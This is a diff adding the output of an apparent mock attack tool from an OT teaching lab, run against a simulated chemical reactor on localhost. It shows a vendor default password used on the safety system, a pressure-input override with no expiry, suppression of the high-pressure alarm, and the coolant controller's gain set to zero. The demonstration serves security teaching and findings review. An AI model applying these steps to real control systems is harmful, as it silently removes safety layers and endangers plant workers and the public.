@@ -1,0 +1,66 @@
+
+              __     _        _           _
+  __ _____   / /    (_)__    (_)__  ___ _/ /_
+ / // / -_) / /__  / / _ \  / / _ \/ _ `/ __/
+ \_, /\__/ /____/_/ /_//_/ /_/_//_/\_,_/\__/
+/___/                 mock engineering tool
+       for the Deccan OT-03 teaching lab
+
+  target  : 127.0.0.1  sis:15002  dcs:15003
+  site    : Deccan Speciality Chemicals, Rajkot continuous plant (MOCK)
+
+==========================================================================
+  STAGE 2: LAYER 3 - put a maintenance override on the pressure input
+==========================================================================
+target      : SafeGuard SIS   logic R201-SIS-L4.2 (proof tested 14 Feb 2027)
+key switch  : RUN
+
+password    : 'VTA-SAFE-2019'
+              read from the vendor install guide, section 4.3;
+              'a site wide value, identical on all installations'
+auth        : {'ok': True, 'config_mode': True}
+override    : {"tag": "PIT-104", "set_at": "2027-04-02 22:00:00", "set_by": "ENG-DCS-01", "reason": "instrument drift check", "expires": null}
+              expires: null   <- there is no time limit (F10)
+              accepted while the key switch is in RUN (F13)
+
+what the safety function can now see:
+  the pressure input reads as healthy no matter what the reactor does.
+  the trip is not broken. it cannot be reached. that is an override.
+
+==========================================================================
+  STAGE 3: LAYER 2 - take the high pressure alarm off the operator
+==========================================================================
+alarm       : R-201-HP-ALM suppressed -> True
+              the operator is not told. the suppression list exists,
+              it is simply not drawn on his default view (F17).
+
+==========================================================================
+  STAGE 4: LAYER 1 - break the cooling without touching the set point
+==========================================================================
+reading the loop first:
+  FIC-101: {"tag": "FIC-101", "desc": "R-201 coolant flow", "sp": 62.0, "pv": 62.0, "out": 62.0, "mode": "AUTO", "gain": 1.0, "bias": 0.0, "configured_by": null}
+
+writing     : gain 1.0 -> 0.0
+              {"gain": "1.0 -> 0.0", "bias": "0.0 -> 0.0"}
+              the output now tracks sp*gain+bias = 0 for every
+              set point. the set point is never touched, so the
+              operator's screen shows a healthy controller, and the
+              journal records no operating action (F2).
+
+==========================================================================
+  STAGE 5: CHECK - the state of the plant as the attacker leaves it
+==========================================================================
+safety overrides live        : [{"tag": "PIT-104", "set_at": "2027-04-02 22:00:00", "set_by": "ENG-DCS-01", "reason": "instrument drift check", "expires": null}]
+suppressed alarms            : [{"tag": "R-201-HP-ALM", "since": "2027-04-02 22:00:00", "by": "a.rathod@deccan.local"}]
+suppressed list on screen?   : False
+coolant controller set point : 62.0
+coolant controller gain      : 0.0
+coolant controller output    : 0.0   <- was 62.0 an hour ago
+
+three protection layers are now out of the way and nothing has been
+broken. no malware, no exploit, no unusual process. three writes.
+
+what happens next is not part of the attack and needs no tooling:
+cooling is gone, so the reactor heats, the pressure climbs, the alarm
+never appears, the trip never fires, and the last layer - a spring,
+some steel and no electronics at all - is the one that saves the site.
